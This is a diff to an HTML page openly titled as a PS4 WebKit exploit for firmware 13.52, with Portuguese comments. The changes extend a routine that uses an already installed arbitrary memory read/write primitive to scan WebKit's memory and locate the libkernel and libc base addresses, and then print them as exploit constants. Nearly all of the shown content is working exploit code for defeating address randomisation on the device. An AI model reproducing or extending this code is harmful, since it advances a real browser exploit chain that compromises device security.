@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Direct Stub Resolver)</title>
+<title>PS4 WebKit Exploit (13.52 - Full Resolver)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -74,7 +74,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ RESOLUÇÃO DE STUBS (13.52) ═══</div>
+  <div class="ct">// ═══ RESOLUÇÃO COMPLETA DE BASES (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -108,29 +108,34 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Varredura segura na região típica de stubs e imports do WebKit (faixa de 0x3000000 a 0x3800000)
-async function resolveKernelStubs(p, webkitBase) {
-  logH('VARREDURA DE STUBS DA LIBKERNEL');
+// Resolução simultânea e segura de libkernel e libc via stubs do WebKit
+async function resolveAllStubs(p, webkitBase) {
+  logH('VARREDURA DE STUBS DO SISTEMA');
   let libKernelBase = null;
+  let libcBase = null;
 
   try {
-    // Varre a região de stubs/imports mapeada no binário do WebKit
-    for (let off = 0x3000000; off < 0x3800000; off += 8) {
+    for (let off = 0x3000000; off < 0x3900000; off += 8) {
       try {
         let ptr = p.read8(webkitBase.add32(off));
-        // Se o ponteiro apontar para a faixa de memória da libkernel (0x80xxxxxxx)
-        if (ptr.hi === 0x80 && (ptr.low & 0x3FFF) === 0) {
-          libKernelBase = new int64(ptr.low, ptr.hi);
-          log(`[+] libkernel Base isolada no offset RVA 0x${off.toString(16)}: 0x${libKernelBase.toString()}`, 'ok');
-          break;
+        let hi = ptr.hi;
+        let alignedLow = ptr.low & ~0x3FFF;
+
+        if (hi === 0x80 && !libKernelBase) {
+          libKernelBase = new int64(alignedLow, hi);
+          log(`[+] libkernel Base: 0x${libKernelBase.toString()}`, 'ok');
+        } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
+          libcBase = new int64(alignedLow, hi);
+          log(`[+] libc Base: 0x${libcBase.toString()}`, 'ok');
         }
       } catch (e) {}
+      if (libKernelBase && libcBase) break;
     }
   } catch (err) {
-    log('[-] Erro na varredura de stubs: ' + err.message, 'e');
+    log('[-] Erro na varredura: ' + err.message, 'e');
   }
 
-  return libKernelBase;
+  return { libKernelBase, libcBase };
 }
 
 async function main() {
@@ -177,7 +182,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Resolvendo bases e stubs...', 'r');
+  setStatus('Resolvendo bases e stubs do sistema...', 'r');
   logH('RESOLUÇÃO DE BASES (13.52)');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -201,20 +206,23 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    // Dispara a busca direcionada na área de stubs após estabilização
+    // Dispara a resolução completa após estabilização
     setTimeout(async () => {
-      const lkBase = await resolveKernelStubs(p, webkitBase);
-      if (lkBase) setCard('c-lk', '0x' + lkBase.toString());
+      const bases = await resolveAllStubs(p, webkitBase);
+      
+      if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
+      if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
 
-      setStatus('Mapeamento concluído!', 'ok');
-      log('✔ Ambiente pronto para os próximos passos.', 'ok');
+      setStatus('Mapeamento completo realizado com sucesso!', 'ok');
+      log('✔ Todas as bases do sistema foram isoladas.', 'ok');
 
       const cbox = document.getElementById('cbox');
       cbox.style.display = 'block';
       document.getElementById('c-out').textContent =
         `__ps5NativeCtor = 0x${ctorInt64.toString()}\n` +
         `WebKit Base    = 0x${webkitBase.toString()}\n` +
-        `libkernel Base = ${lkBase ? '0x' + lkBase.toString() : 'Não mapeado'}`;
+        `libkernel Base = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'Não mapeado'}\n` +
+        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'Não mapeado'}`;
     }, 1000);
 
   } else {
